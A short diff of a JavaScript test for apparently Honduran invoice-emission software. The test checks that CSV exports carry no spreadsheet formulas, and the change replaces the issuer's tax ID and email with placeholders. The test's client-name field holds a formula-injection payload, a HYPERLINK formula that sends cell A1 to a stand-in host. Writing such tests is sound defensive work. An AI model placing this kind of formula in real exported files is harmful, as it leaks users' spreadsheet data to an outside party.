@@ -14,7 +14,7 @@ describe('CSV sin fórmulas', () => {
       rangoInicial: 1, rangoFinal: 10, fechaLimiteEmision: '2027-06-30',
     });
     const doc = await emitir({
-      emisor: { rtn: '08011999123456', razonSocial: 'E', nombreComercial: 'E', direccionCasaMatriz: 'D', direccionEstablecimiento: 'D', telefono: '1', correo: 'e@e.hn' },
+      emisor: { rtn: '99990000000001', razonSocial: 'E', nombreComercial: 'E', direccionCasaMatriz: 'D', direccionEstablecimiento: 'D', telefono: '1', correo: 'e@ejemplo.example' },
       cliente: { nombre: '=HYPERLINK("http://x.example/?a="&A1,"ok")' },
       lineas: [{ descripcion: 'x', cantidad: 1, precioUnitario: '10' }],
     }, { almacen, establecimiento: '000', puntoEmision: '001' });
